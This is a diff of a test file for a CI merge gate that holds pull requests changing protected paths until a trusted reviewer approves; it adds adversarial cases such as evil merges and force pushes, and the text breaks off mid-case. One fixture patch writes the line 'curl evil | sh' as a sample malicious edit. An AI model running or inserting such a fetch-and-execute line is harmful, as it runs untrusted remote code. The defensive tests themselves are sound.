@@ -19,7 +19,8 @@ import { writeFileSync } from "node:fs";
 import { join } from "node:path";
 import { test } from "node:test";
 
-import { BODY_WRITERS_QUERY, COMMENT_EDITED_QUERY, HOLD_PATH_CLASSES, HOLD_PATH_FLOOR, PULL_OPENED_QUERY, REVIEW_FLOOR, changeOf, costDecision, costHold, costNotices, decidedHead, evidenceHold, laneChange, linkHold, main, pathHold, sameNetChange, unranHead } from "./merge-holds.mjs";
+import * as holdsModule from "./merge-holds.mjs";
+import { BODY_WRITERS_QUERY, COMMENT_EDITED_QUERY, HOLD_PATH_CLASSES, HOLD_PATH_FLOOR, PULL_OPENED_QUERY, REVIEW_FLOOR, baseMergeCarry, baseMergesOnly, changeOf, mergedParents, costDecision, costHold, costNotices, decidedHead, evidenceHold, laneChange, linkHold, main, pathHold, sameNetChange, unranHead } from "./merge-holds.mjs";
 import { tempDir } from "../../../lib/test-tmp.mjs";
 
 const REPO = "owner/repo";
@@ -57,6 +58,16 @@ const pushesOf = (runs) =>
 // A compare answer: the pull request's files against the base.
 const TF = { filename: "infra/main.tf", status: "modified", patch: "@@ -1 +1 @@\n-a\n+b" };
 const net = (...files) => ({ files });
+// A base commit a merge of the base names as its second parent.
+const MAIN = "5".repeat(40);
+// `answer` (a compare of base...sha) with the commits a history of base
+// merges lists unless it names its own: OLD alone for OLD, OLD and a merge
+// HEAD of the base for HEAD, the head alone for any other.
+const history = (sha, answer) => {
+  if (answer === null || typeof answer !== "object" || "commits" in answer || !("files" in answer)) return answer;
+  const commits = [{ sha: sha === HEAD ? OLD : sha, parents: [{ sha: MAIN }] }, ...(sha === HEAD ? [{ sha: HEAD, parents: [{ sha: OLD }, { sha: MAIN }] }] : [])];
+  return { ...answer, commits, total_commits: commits.length };
+};
 
 const comment = (changes = {}) => ({
   issue_url: "https://api.github.com/repos/owner/repo/issues/40",
@@ -96,6 +107,18 @@ function world({
       }
       return activity;
     }
+    // The base branch resolves to TIP; a merged parent against it, of
+    // which MAIN is in the base.
+    if (path.startsWith("/repos/owner/repo/git/ref/heads/")) {
+      reads.push("ref");
+      if (fail === "ref") throw new Error("ref failed");
+      return { object: { sha: TIP } };
+    }
+    const parent = new RegExp(`^/repos/owner/repo/compare/([0-9a-f]{40})\\.\\.\\.${TIP}$`).exec(path);
+    if (parent) {
+      reads.push(`base ${parent[1]}`);
+      return { status: parent[1] === MAIN ? "ahead" : "diverged" };
+    }
     const compare = /^\/repos\/owner\/repo\/compare\/(.+)\.\.\.([0-9a-f]{40})$/.exec(path);
     const listing = /^\/repos\/owner\/repo\/actions\/workflows\/([a-z-]+\.yml)\/runs\?event=pull_request&branch=fix%2Fcost&per_page=100&page=1$/.exec(path);
     const jobs = /^\/repos\/owner\/repo\/actions\/runs\/([0-9]+)\/jobs\?filter=all&per_page=100&page=1$/.exec(path);
@@ -129,11 +152,13 @@ function world({
       return runs[Number(notes[1]) - 1].notes;
     }
     if (compare) {
-      assert.equal(compare[1], base);
+      // Every compare, the lane-change vet's and the carry's, names the
+      // base's tip commit, never the branch.
+      assert.equal(compare[1], TIP);
       if (!(compare[2] in answers)) {
         throw new Error("no such commit");
       }
-      return answers[compare[2]];
+      return history(compare[2], answers[compare[2]]);
     }
     if (read === "pull") {
       assert.deepEqual(body.variables, { owner: "owner", name: "repo", number: 99 });
@@ -170,6 +195,7 @@ test("an owner decision on the closing issue, linked from the body, clears the c
     "pull",
     "GET /repos/owner/repo/issues/comments/7",
     "edited",
+    "ref",
     "runs pr-review-hosted.yml",
     `compare ${HEAD}`,
     "jobs 1",
@@ -380,12 +406,23 @@ const ENFORCEMENT_FILES = [
   "plugins/source-control/skills/babysit-prs/scripts/babysit_verify_evidence.py",
   "plugins/source-control/skills/babysit-prs/scripts/babysit_gh.py",
   ".github/scripts/pr-unblock/address-feedback.mjs",
+  ".github/scripts/pr-unblock/escalation-routes.mjs",
+  ".github/scripts/pr-unblock/escalation-routes.json",
   ".github/scripts/pr-unblock/gate-source.mjs",
   ".github/scripts/pr-unblock/thread-scope.mjs",
   ".github/scripts/pr-unblock/retry-fetch.mjs",
   ".github/scripts/work-resolve-issue/report-outcome.mjs",
   ".github/scripts/work-resolve-issue/limits.mjs",
   ".github/scripts/work-resolve-issue/retry-fetch.mjs",
+  ".github/scripts/pr-unblock/report-escalation.sh",
+  ".github/scripts/pr-unblock/adjudicate-feedback.mjs",
+  ".github/scripts/pr-unblock/publish-feedback.mjs",
+  ".github/scripts/pr-unblock/request-budget.mjs",
+  ".github/scripts/pr-unblock/dependency-classify.mjs",
+  ".github/scripts/apply-patch/apply-patch.mjs",
+  ".github/scripts/apply-patch/predicates.mjs",
+  ".github/scripts/apply-patch/protected-paths.mjs",
+  ".github/scripts/apply-patch/retry-fetch.mjs",
   ".github/scripts/pr-unblock/fix-ci-context.mjs",
   ".github/scripts/maintenance-reconcile-lost-runs/infra-failure.mjs",
   ".github/scripts/work-resolve-issue/stop-routes.json",
@@ -459,7 +496,7 @@ test("ci-status holds a trusted-actor list widening until a trusted person appro
   const list = { [BASE]: listOf(KYLE), [HEAD]: listOf(KYLE, LANES) };
   const widened = await ci(modified, { list });
   assert.equal(widened.code, 1, widened.out);
-  assert.match(widened.out, /it widens the trusted-actor list \(\.github\/standards\/trusted-actors\/trusted-actors\.json: entries added or changed: .*lanes\[bot\].*\); an approving review of this head/);
+  assert.match(widened.out, /it widens the trusted-actor list \(\.github\/standards\/trusted-actors\/trusted-actors\.json: entries added or changed: .*lanes\[bot\].*\); an approving review of this head by a person on the trusted-actor list lifts it/);
   const approved = await ci(modified, { list, reviews: [approve] });
   assert.equal(approved.code, 0, approved.out);
   assert.match(approved.out, /owner-person approved this head, which lifts its trusted-actor list hold/);
@@ -527,14 +564,21 @@ test("a base merge after the decision carries it, and a pull request commit afte
   assert.equal((await later({ [OLD]: net(TF), [HEAD]: net(TF) })).link, LINK);
   const commit = await later({ [OLD]: net(TF), [HEAD]: net(TF, { filename: "scripts/run.sh", status: "modified", patch: "@@ -1 +1 @@\n-x\n+y" }) });
   assert.equal(commit.link, null);
-  assert.deepEqual(commit.reads.slice(-3), ["activity", `compare ${OLD}`, `compare ${HEAD}`]);
+  assert.deepEqual(commit.reads.slice(-4), ["activity", `compare ${OLD}`, `compare ${HEAD}`, `base ${MAIN}`]);
+  assert.equal(commit.reads.filter((read) => read === "ref").length, 1);
 });
 
-test("a rebase onto a newer base with the same net change carries, whatever order the files list in", async () => {
+test("a base merge with the same net change carries whatever order the files list in, and a rebase or a non-merge commit does not", async () => {
   const doc = { filename: "docs/a.md", status: "added", patch: "@@ -0,0 +1 @@\n+a" };
   assert.equal((await later({ [OLD]: net(TF, doc), [HEAD]: net(doc, TF) })).link, LINK);
-  // A rebase that drops one of its files is a change of its own.
+  // A merge that drops one of its files is a change of its own.
   assert.equal((await later({ [OLD]: net(TF, doc), [HEAD]: net(TF) })).link, null);
+  // A rebase or force push rewrites OLD away, even with the same net change.
+  const rebased = { ...net(TF), commits: [{ sha: "6".repeat(40), parents: [{ sha: MAIN }] }, { sha: HEAD, parents: [{ sha: "6".repeat(40) }] }], total_commits: 2 };
+  assert.equal((await later({ [OLD]: net(TF), [HEAD]: rebased })).link, null);
+  // A commit of its own that leaves the net change the same is still not a merge.
+  const plain = { ...net(TF), commits: [{ sha: OLD, parents: [{ sha: MAIN }] }, { sha: HEAD, parents: [{ sha: OLD }] }], total_commits: 2 };
+  assert.equal((await later({ [OLD]: net(TF), [HEAD]: plain })).link, null);
 });
 
 test("a conflict resolution, a rename or a status change that alters the net change re-holds", async () => {
@@ -886,4 +930,436 @@ test("in the merge queue, a missing or unreadable reader report holds", async ()
     assert.equal(code, 1, `${evidence}: ${out}`);
     assert.match(out, /::error::#99: its pr-verify FAILs could not be read/, String(evidence));
   }
+});
+
+// A hold path's approval survives a base merge (the churn measured on
+// #10224): a trusted person's approving review of a head lifts a later head
+// only when every commit since is a merge of commits the base holds
+// (baseMergesOnly) and the net change against the base's tip is the same
+// over every file (sameNetChange), or the merges brought exactly the base's
+// changes (exactBaseCarry). The base is read once by its full ref (baseTip),
+// and every compare against it names its tip commit. A label removal never
+// lifts a hold path, and a dismissed approval counts only when GitHub
+// dismissed it as stale on a base merge's push. Every adversarial shape
+// keeps the hold.
+const HELD = ".github/actions/resolve-config/live-config.test.mjs";
+const HELD_PATCH = { filename: HELD, status: "modified", patch: "@@ -1 +1 @@\n-a\n+b" };
+const OTHER_HELD = { filename: ".github/actions/resolve-config/resolve.test.mjs", status: "modified", patch: "@@ -1 +1 @@\n-c\n+d" };
+const HELPER = { filename: "scripts/helper.sh", status: "modified", patch: "@@ -1 +1 @@\n-x\n+y" };
+const APPROVED_AT = "2026-10-27T23:26:14Z";
+const OTHER = "7".repeat(40);
+// The base branch's tip commit, which `refs/heads/main` resolves to.
+const TIP = "3".repeat(40);
+const review = (state, commit, at = APPROVED_AT, id = 5, type = "User") => ({ id: 41, user: { login: id === 5 ? "owner-person" : "someone", id, type }, state, commit_id: commit, submitted_at: at });
+// The merge bases of the approved head and of the head with the base's tip.
+const MB_OLD = "1".repeat(40);
+const MB_HEAD = "2".repeat(40);
+const merged = (files) => ({ files, merge_base_commit: { sha: MB_HEAD }, commits: [{ sha: OLD, parents: [{ sha: MAIN }] }, { sha: HEAD, parents: [{ sha: OLD }, { sha: MAIN }] }], total_commits: 2 });
+const atOld = (files = [HELD_PATCH]) => ({ files, merge_base_commit: { sha: MB_OLD }, commits: [{ sha: OLD, parents: [{ sha: MAIN }] }], total_commits: 1 });
+// What the merges brought into the approved head (compare OLD...HEAD), and
+// what the base changed over the same range (compare MB_OLD...MB_HEAD).
+const BASE_DOC = { filename: "docs/base.md", status: "modified", patch: "@@ -1 +1 @@\n-p\n+q" };
+const brought = (files = [BASE_DOC], extra = {}) => ({ status: "ahead", behind_by: 0, files, commits: [{ sha: MAIN }, { sha: HEAD }], total_commits: 2, ...extra });
+const baseRange = (files = [BASE_DOC], extra = {}) => ({ status: "ahead", behind_by: 0, files, commits: [{ sha: MB_HEAD }], total_commits: 1, ...extra });
+const ranges = (merges = brought(), based = baseRange()) => ({ [`${OLD}...${HEAD}`]: merges, [`${MB_OLD}...${MB_HEAD}`]: based });
+// A recursive tree answer: each entry [path, mode].
+const treeOf = (entries, extra = {}) => ({ truncated: false, tree: entries.map(([path, mode = "100644"]) => ({ path, mode, type: "blob", sha: "b".repeat(40) })), ...extra });
+const FILES_AT = [["docs/base.md"], [".github/actions/collect-base-activity/collect-base-activity.test.mjs"], [".github/actions/resolve-config/live-config.test.mjs"], ["scripts/helper.sh"], ["scripts/lib.mjs"]];
+// The trees of the head and of its merge base with the tip, which the exact
+// carry reads for file modes.
+const trees = (head = treeOf(FILES_AT), base = treeOf(FILES_AT)) => ({ [HEAD]: head, [MB_HEAD]: base });
+const liftWorld = ({
+  reviews = [review("APPROVED", OLD)],
+  compares = { [OLD]: atOld(), [HEAD]: merged([HELD_PATCH]) },
+  // The two range compares the exact carry reads, consistent by default.
+  across = ranges(),
+  modes = trees(),
+  // The pull request's base branch and the repository's default branch.
+  base = "main",
+  defaultBranch = "main",
+  fork = false,
+  // The issue timeline, read for the review_dismissed events.
+  timeline = [],
+  // The base's answer per merged parent against its tip.
+  bases = { [MAIN]: "ahead" },
+  tip = TIP,
+  // The pull request's own count of changed files; the head compare's by default.
+  changed = null,
+  // A label history and push history the earlier reader bound a removal by,
+  // served so a test proves no reader counts them now.
+  events = [],
+  activity = [push(HEAD, "2026-10-27T23:32:00Z"), push(OLD, "2026-10-27T23:00:00Z")],
+  fail = "",
+} = {}) => {
+  const reads = [];
+  const tracker = { config: { role_labels: { "human-gated": "needs-human" } } };
+  const github = async (method, path) => {
+    reads.push(path);
+    assert.equal(method, "GET");
+    if (fail && path.includes(fail)) throw new Error(`${fail} failed`);
+    if (path === "/repos/owner/repo/pulls/99") return { head: { sha: HEAD, ref: "fix/cost", repo: { full_name: fork ? "someone/repo" : REPO } }, base: { ref: base }, changed_files: changed ?? compares[HEAD]?.files?.length };
+    if (path === "/repos/owner/repo") {
+      if (defaultBranch === null) throw new Error("the repository did not read");
+      return { full_name: REPO, default_branch: defaultBranch };
+    }
+    if (path === `/repos/owner/repo/git/ref/heads/${base}`) return { ref: `refs/heads/${base}`, object: { type: "commit", sha: tip } };
+    const tree = /^\/repos\/owner\/repo\/git\/trees\/([0-9a-f]{40})\?recursive=1$/.exec(path);
+    if (tree && tree[1] in modes) return modes[tree[1]];
+    if (path.startsWith("/repos/owner/repo/pulls/99/reviews?")) return path.endsWith("page=1") ? reviews : [];
+    if (path.startsWith("/repos/owner/repo/issues/99/events?")) return path.endsWith("page=1") ? events : [];
+    if (path.startsWith("/repos/owner/repo/issues/99/timeline?")) return path.endsWith("page=1") ? timeline : [];
+    if (path === "/repos/owner/repo/activity?ref=refs%2Fheads%2Ffix%2Fcost&direction=desc&per_page=100") return activity;
+    if (path === `/repos/owner/repo/contents/.work-item-tracker.json?ref=${BASE}`) return { type: "file", encoding: "base64", content: Buffer.from(JSON.stringify(tracker)).toString("base64") };
+    const parent = new RegExp(`^/repos/owner/repo/compare/([0-9a-f]{40})\\.\\.\\.${TIP}$`).exec(path);
+    if (parent) return { status: bases[parent[1]] ?? "diverged" };
+    const compare = new RegExp(`^/repos/owner/repo/compare/${TIP}\\.\\.\\.([0-9a-f]{40})$`).exec(path);
+    if (compare && compare[1] in compares) return compares[compare[1]];
+    const range = /^\/repos\/owner\/repo\/compare\/([0-9a-f]{40}\.\.\.[0-9a-f]{40})$/.exec(path);
+    if (range && range[1] in across) return across[range[1]];
+    throw new Error(`unexpected read ${path}`);
+  };
+  return { github, reads };
+};
+// main over `files` with liftWorld's reads; `reviews` also go in the
+// discussion file, as ci-status writes it.
+async function lifting(world, { files = [HELD], reviews = [], queue = false } = {}) {
+  const dir = tempDir("merge-holds-lift-");
+  writeFileSync(join(dir, "body"), "Closes #40");
+  writeFileSync(join(dir, "discussion"), reviews.map((row) => JSON.stringify(row)).join("\n"));
+  writeFileSync(join(dir, "actors"), JSON.stringify({ actors: [{ kind: "human", login: "owner-person", id: 5 }] }));
+  writeFileSync(join(dir, "files"), files.map((path) => JSON.stringify([path])).join("\n"));
+  writeFileSync(join(dir, "denied"), "[]");
+  const argv = ["99", ...["body", "discussion", "files", "denied", "actors"].map((name) => join(dir, name)), HEAD];
+  if (queue) {
+    writeFileSync(join(dir, "verdicts"), "");
+    writeFileSync(join(dir, "link"), "null");
+    argv.push(join(dir, "verdicts"), join(dir, "link"));
+  }
+  const lines = [];
+  const log = console.log;
+  console.log = (line) => lines.push(line);
+  try {
+    const code = await main(argv, { env: { GITHUB_REPOSITORY: REPO, BASE_SHA: BASE }, github: world.github });
+    return { code, out: lines.join("\n") };
+  } finally {
+    console.log = log;
+  }
+}
+const HOLD_REASON = /it changes \.github\/actions\/resolve-config\/live-config\.test\.mjs, a hold path; an approving review of this head by a person on the trusted-actor list lifts it/;
+
+test("an approval of an earlier head lifts a hold path over a later base merge, read against the base's tip commit", async () => {
+  for (const [name, compares] of Object.entries({
+    "a base merge": { [OLD]: atOld(), [HEAD]: merged([HELD_PATCH]) },
+    "a base merge with a non-hold file in the net change": { [OLD]: atOld([HELD_PATCH, HELPER]), [HEAD]: merged([HELPER, HELD_PATCH]) },
+  })) {
+    const world = liftWorld({ compares });
+    const run = await lifting(world);
+    assert.equal(run.code, 0, `${name}: ${run.out}`);
+    assert.match(run.out, /owner-person approved an earlier head whose every change since is a base merge, which lifts its hold path/, name);
+    // The base is resolved once by its full ref; no compare names the branch.
+    assert.equal(world.reads.filter((path) => path.includes("/git/ref/")).length, 1, name);
+    assert.ok(world.reads.includes(`/repos/owner/repo/compare/${TIP}...${OLD}`) && world.reads.includes(`/repos/owner/repo/compare/${MAIN}...${TIP}`), world.reads.join(" "));
+    assert.ok(!world.reads.some((path) => /\/compare\/(main\.\.\.|.*\.\.\.main$)/.test(path)), world.reads.join(" "));
+  }
+});
+
+// The owner's decision on #10596: a trusted person's label removal lifts no
+// hold path, at the head or before a base merge, and a dismissed approval
+// never counts, even one GitHub dismissed as stale on a push. The lanes App
+// put the label on at 23:05; the person removed it at 23:26:14.
+const LABEL = (event, at, id, login, app = null) => ({ event, label: { name: "needs-human" }, actor: { id, login }, performed_via_github_app: app, created_at: at });
+const REMOVAL = [LABEL("labeled", "2026-10-27T23:05:00Z", 2, "lanes[bot]", { slug: "lanes" }), LABEL("unlabeled", APPROVED_AT, 5, "owner-person")];
+// GitHub's own stale-review dismissal on the base merge's push, as #10224's
+// timeline shows it: the pushing App as actor, no message, the pushed commit.
+const STALE = {
+  event: "review_dismissed",
+  actor: { id: 2, login: "lanes[bot]", type: "Bot" },
+  created_at: "2026-10-27T23:32:35Z",
+  dismissed_review: { review_id: 41, state: "approved", dismissal_message: null, dismissal_commit_id: HEAD },
+};
+const stale = (change = {}, actor = {}) => ({ ...STALE, actor: { ...STALE.actor, ...actor }, dismissed_review: { ...STALE.dismissed_review, ...change } });
+const DISMISSED_OLD = review("DISMISSED", OLD, "2026-10-27T23:31:57Z");
+test("a label removal lifts no hold path", async () => {
+  for (const [name, options] of Object.entries({
+    "a removal before a base merge": { reviews: [], events: REMOVAL },
+    "a removal while this is the head": { reviews: [], events: REMOVAL, activity: [push(HEAD, "2026-10-27T23:00:00Z")] },
+    "a removal beside an approval dismissed by a person": { reviews: [DISMISSED_OLD], events: REMOVAL, timeline: [stale({ dismissal_message: "stale" }, { type: "User" })] },
+  })) {
+    const world = liftWorld(options);
+    const run = await lifting(world);
+    assert.equal(run.code, 1, `${name}: ${run.out}`);
+    assert.match(run.out, HOLD_REASON, name);
+    assert.ok(!world.reads.some((path) => /\/(events|activity)\?/.test(path) || path.includes("/contents/.work-item")), `${name}: ${world.reads.join(" ")}`);
+  }
+});
+
+// The owner's decision of 2026-10-28 (part a): an approval GitHub dismissed
+// as stale on the push of a base merge still counts, bound to its own commit,
+// and lifts the head only through the carry.
+test("an approval GitHub dismissed as stale on a base merge's push carries", async () => {
+  for (const [name, options] of Object.entries({
+    "the same net change": { reviews: [DISMISSED_OLD], timeline: [STALE] },
+    "beside a label removal": { reviews: [DISMISSED_OLD], timeline: [STALE], events: REMOVAL },
+    "a timeline review id read as a string": { reviews: [DISMISSED_OLD], timeline: [stale({ review_id: "41" })] },
+  })) {
+    const world = liftWorld(options);
+    const run = await lifting(world);
+    assert.equal(run.code, 0, `${name}: ${run.out}`);
+    assert.match(run.out, /owner-person approved an earlier head whose every change since is a base merge, which lifts its hold path/, name);
+    assert.ok(world.reads.some((path) => path.startsWith("/repos/owner/repo/issues/99/timeline?")), name);
+  }
+});
+
+test("a dismissal with a message, by a person, or not by the push the carry checks revokes the approval", async () => {
+  for (const [name, options] of Object.entries({
+    "a dismissal with a message": { timeline: [stale({ dismissal_message: "stale" })] },
+    "an empty message": { timeline: [stale({ dismissal_message: "" })] },
+    "no message field": { timeline: [{ ...STALE, dismissed_review: { review_id: 41, state: "approved", dismissal_commit_id: HEAD } }] },
+    "a dismissal by a person": { timeline: [stale({}, { type: "User" })] },
+    "a dismissal with no actor": { timeline: [{ ...STALE, actor: null }] },
+    "a dismissed request for changes": { timeline: [stale({ state: "changes_requested" })] },
+    "a dismissal of another review": { timeline: [stale({ review_id: 42 })] },
+    "a second dismissal event with a message": { timeline: [STALE, stale({ dismissal_message: "no" }, { type: "User" })] },
+    "a dismissal commit the merges did not push": { timeline: [stale({ dismissal_commit_id: OTHER })] },
+    "the approved head as the dismissal commit": { timeline: [stale({ dismissal_commit_id: OLD })] },
+    "a dismissal commit that is no sha": { timeline: [stale({ dismissal_commit_id: null })] },
+    "no dismissal event": { timeline: [] },
+    "an unreadable timeline": { timeline: [STALE], fail: "/timeline?" },
+    // Approve the head, push X, force-push the head back: no range, no lift.
+    "a dismissed approval of the head itself": { reviews: [review("DISMISSED", HEAD, "2026-10-27T23:31:57Z")], timeline: [stale()] },
+    "a request for changes after the dismissed approval": { reviews: [DISMISSED_OLD, { ...review("CHANGES_REQUESTED", HEAD, "2026-10-27T23:40:00Z"), id: 43 }], timeline: [STALE] },
+    "a dismissed approval by a person off the trusted-actor list": { reviews: [review("DISMISSED", OLD, APPROVED_AT, 77)], timeline: [STALE] },
+    "a merge that also edits a file": { timeline: [STALE], compares: { [OLD]: atOld([HELD_PATCH, HELPER]), [HEAD]: merged([HELD_PATCH, { ...HELPER, patch: "+evil" }]) }, across: ranges(brought([BASE_DOC, { ...HELPER, patch: "+evil" }])) },
+  })) {
+    const run = await lifting(liftWorld({ reviews: [DISMISSED_OLD], ...options }));
+    assert.equal(run.code, 1, `${name}: ${run.out}`);
+    assert.match(run.out, HOLD_REASON, name);
+  }
+});
+
+// The owner's decision of 2026-10-28 (part b): when the net change differs
+// because the base changed a file the pull request also changes (#10224's
+// shape), the approval carries only when what the merges brought into the
+// approved head (OLD...HEAD) is, file for file, what the base changed between
+// the two merge bases (MB_OLD...MB_HEAD): identical status and patch.
+// #10224's own patches: the pull request's hunks sit lower in the shared
+// file, so the base's hunk applies with the same header and context.
+const SHARED_AT_OLD = { filename: ".github/actions/collect-base-activity/collect-base-activity.test.mjs", status: "modified", patch: "@@ -93,6 +93,13 @@ let root;\n context\n+mine" };
+const SHARED_AT_HEAD = { ...SHARED_AT_OLD, patch: "@@ -98,6 +98,13 @@ let root;\n context\n+mine" };
+const SHARED_BASE = { filename: SHARED_AT_OLD.filename, status: "modified", patch: "@@ -10,6 +10,11 @@ import\n+theirs" };
+const REPLAY = { compares: { [OLD]: atOld([HELD_PATCH, SHARED_AT_OLD]), [HEAD]: merged([HELD_PATCH, SHARED_AT_HEAD]) }, across: ranges(brought([BASE_DOC, SHARED_BASE]), baseRange([SHARED_BASE, BASE_DOC])) };
+test("#10224's shape carries when the merges brought exactly the base's changes", async () => {
+  for (const [name, options] of Object.entries({
+    "an approval standing at the earlier head": REPLAY,
+    "an approval GitHub dismissed as stale": { ...REPLAY, reviews: [DISMISSED_OLD], timeline: [STALE] },
+  })) {
+    const world = liftWorld(options);
+    const run = await lifting(world);
+    assert.equal(run.code, 0, `${name}: ${run.out}`);
+    assert.match(run.out, /which lifts its hold path/, name);
+    assert.ok(world.reads.includes(`/repos/owner/repo/compare/${OLD}...${HEAD}`) && world.reads.includes(`/repos/owner/repo/compare/${MB_OLD}...${MB_HEAD}`), world.reads.join(" "));
+  }
+  // The same net change needs neither range compare.
+  const world = liftWorld();
+  assert.equal((await lifting(world)).code, 0);
+  assert.ok(!world.reads.some((path) => path.includes(`/compare/${OLD}...`) || path.includes(`/compare/${MB_OLD}...`)), world.reads.join(" "));
+});
+
+test("a merge that adds anything beyond the base's changes, or a range not read whole, carries nothing", async () => {
+  const shape = (merges, based = baseRange([BASE_DOC, SHARED_BASE]), more = {}) => ({ ...REPLAY, across: ranges(merges, based), ...more });
+  const many = Array.from({ length: 300 }, (_, i) => ({ filename: `docs/${i}.md`, status: "modified", patch: "+x" }));
+  for (const [name, options] of Object.entries({
+    "a merge that also edits a hold path": shape(brought([BASE_DOC, SHARED_BASE, { ...HELD_PATCH, patch: "@@ -1 +1 @@\n-b\n+evil" }])),
+    "a merge that also edits a non-hold file": shape(brought([BASE_DOC, SHARED_BASE, HELPER])),
+    "a merge that changes the base's hunk": shape(brought([BASE_DOC, { ...SHARED_BASE, patch: "@@ -10,6 +10,11 @@ import\n+theirs\n+evil" }])),
+    "a merge that renames a base file": shape(brought([{ ...BASE_DOC, status: "renamed", previous_filename: "docs/old.md" }, SHARED_BASE])),
+    "a base change reverted inside the merge": shape(brought([SHARED_BASE])),
+    "a base that changed a file the merges did not bring": shape(brought(), baseRange([BASE_DOC, SHARED_BASE, HELPER])),
+    "a merge whose second parent the base does not hold": shape(brought([BASE_DOC, SHARED_BASE]), undefined, {
+      compares: { [OLD]: atOld([HELD_PATCH, SHARED_AT_OLD]), [HEAD]: { ...merged([HELD_PATCH, SHARED_AT_HEAD]), commits: [{ sha: OLD, parents: [{ sha: MAIN }] }, { sha: OTHER, parents: [{ sha: MAIN }, { sha: MAIN }] }, { sha: HEAD, parents: [{ sha: OLD }, { sha: OTHER }] }], total_commits: 3 } },
+    }),
+    "a non-merge commit beside the merge": shape(brought([BASE_DOC, SHARED_BASE]), undefined, {
+      compares: { [OLD]: atOld([HELD_PATCH, SHARED_AT_OLD]), [HEAD]: { ...merged([HELD_PATCH, SHARED_AT_HEAD]), commits: [{ sha: OLD, parents: [{ sha: MAIN }] }, { sha: OTHER, parents: [{ sha: OLD }, { sha: MAIN }] }, { sha: HEAD, parents: [{ sha: OTHER }] }], total_commits: 3 } },
+    }),
+    "300 files brought": shape(brought(many), baseRange(many)),
+    "300 files in the base's range": shape(brought([BASE_DOC, SHARED_BASE]), baseRange(many)),
+    "a brought file with no patch": shape(brought([BASE_DOC, { ...SHARED_BASE, patch: undefined }]), baseRange([BASE_DOC, { ...SHARED_BASE, patch: undefined }])),
+    "a brought commit list cut short": shape(brought([BASE_DOC, SHARED_BASE], { total_commits: 251 })),
+    "a base range commit list cut short": shape(brought([BASE_DOC, SHARED_BASE]), baseRange([BASE_DOC, SHARED_BASE], { total_commits: 251 })),
+    "a head range that is not ahead": shape(brought([BASE_DOC, SHARED_BASE], { status: "diverged", behind_by: 1 })),
+    "a base range that goes backwards": shape(brought([BASE_DOC, SHARED_BASE]), baseRange([BASE_DOC, SHARED_BASE], { status: "behind", behind_by: 1 })),
+    "no merge base on the approved head's compare": { ...REPLAY, compares: { [OLD]: { ...atOld([HELD_PATCH, SHARED_AT_OLD]), merge_base_commit: null }, [HEAD]: merged([HELD_PATCH, SHARED_AT_HEAD]) } },
+    "an unreadable range compare": { ...REPLAY, fail: `/compare/${OLD}...` },
+    "a dismissal with a message": { ...REPLAY, reviews: [DISMISSED_OLD], timeline: [stale({ dismissal_message: "stale" })] },
+  })) {
+    const run = await lifting(liftWorld(options));
+    assert.equal(run.code, 1, `${name}: ${run.out}`);
+    assert.match(run.out, HOLD_REASON, name);
+  }
+});
+
+test("no adversarial history, approval or reviewer carries a lift to the head", async () => {
+  const cases = {
+    // Each merge that writes a change of its own lists it in what the merges
+    // brought (OLD...HEAD) too, beside the base's own change.
+    "a merge that also edits a hold path (an evil merge)": {
+      compares: { [OLD]: atOld(), [HEAD]: merged([{ ...HELD_PATCH, patch: "@@ -1 +1 @@\n-a\n+evil" }]) },
+      across: ranges(brought([BASE_DOC, { ...HELD_PATCH, patch: "@@ -1 +1 @@\n-b\n+evil" }])),
+    },
+    "a merge that adds a hold path": { compares: { [OLD]: atOld(), [HEAD]: merged([HELD_PATCH, OTHER_HELD]) }, across: ranges(brought([BASE_DOC, OTHER_HELD])) },
+    // The re-review of #10596: a merge that rewrites a non-hold file the
+    // approved head already changed, or adds one, writes a change of its own.
+    "a merge that rewrites scripts/helper.sh, which the approved head changed": {
+      compares: { [OLD]: atOld([HELD_PATCH, HELPER]), [HEAD]: merged([HELD_PATCH, { ...HELPER, patch: "@@ -1 +1 @@\n-x\n+curl evil | sh" }]) },
+      across: ranges(brought([BASE_DOC, { ...HELPER, patch: "@@ -1 +1 @@\n-y\n+curl evil | sh" }])),
+    },
+    "a merge that adds a file the base touched, with content of its own": {
+      compares: { [OLD]: atOld(), [HEAD]: merged([HELD_PATCH, { filename: "scripts/lib.mjs", status: "modified", patch: "@@ -1 +1 @@\n-base\n+evil" }]) },
+      across: ranges(brought([BASE_DOC, { filename: "scripts/lib.mjs", status: "modified", patch: "@@ -1 +1 @@\n-base\n+evil" }]), baseRange([BASE_DOC, { filename: "scripts/lib.mjs", status: "modified", patch: "@@ -1 +1 @@\n-lib\n+base" }])),
+    },
+    // The base took in the same change to one of the approved head's files,
+    // so the merges brought less than the base changed: it fails closed.
+    "a merge after which the base holds one of the approved head's files": {
+      compares: { [OLD]: atOld([HELD_PATCH, OTHER_HELD]), [HEAD]: merged([HELD_PATCH]) },
+      across: ranges(brought(), baseRange([BASE_DOC, OTHER_HELD])),
+    },
+    "a non-merge commit after the approval": { compares: { [OLD]: atOld(), [HEAD]: { files: [HELD_PATCH], commits: [{ sha: OLD, parents: [{ sha: MAIN }] }, { sha: HEAD, parents: [{ sha: OLD }] }], total_commits: 2 } } },
+    "a merge of a branch other than the base": {
+      compares: { [OLD]: atOld(), [HEAD]: { files: [HELD_PATCH], commits: [{ sha: OLD, parents: [{ sha: MAIN }] }, { sha: OTHER, parents: [{ sha: MAIN }] }, { sha: HEAD, parents: [{ sha: OLD }, { sha: OTHER }] }], total_commits: 3 } },
+    },
+    // A crafted merge commit (itself a merge of base commits) as the second parent.
+    "a merge whose second parent the base does not hold": {
+      compares: { [OLD]: atOld(), [HEAD]: { files: [HELD_PATCH], commits: [{ sha: OLD, parents: [{ sha: MAIN }] }, { sha: OTHER, parents: [{ sha: MAIN }, { sha: MAIN }] }, { sha: HEAD, parents: [{ sha: OLD }, { sha: OTHER }] }], total_commits: 3 } },
+    },
+    "a merge whose parents are not commit objects": { compares: { [OLD]: atOld(), [HEAD]: { files: [HELD_PATCH], commits: [{ sha: OLD, parents: [{ sha: MAIN }] }, { sha: HEAD, parents: [OLD, MAIN] }], total_commits: 2 } } },
+    "a force push that rewrites the approved head": {
+      compares: { [OLD]: atOld(), [HEAD]: { files: [HELD_PATCH], commits: [{ sha: "6".repeat(40), parents: [{ sha: MAIN }] }, { sha: HEAD, parents: [{ sha: "6".repeat(40) }, { sha: MAIN }] }], total_commits: 2 } },
+    },
+    "a history longer than the compare lists": { compares: { [OLD]: atOld(), [HEAD]: { ...merged([HELD_PATCH]), total_commits: 251 } } },
+    "a head in a fork": { fork: true },
+    // A compare listing fewer files than the pull request changes is cut short.
+    "a compare that lists fewer files than the pull request changes": { changed: 2 },
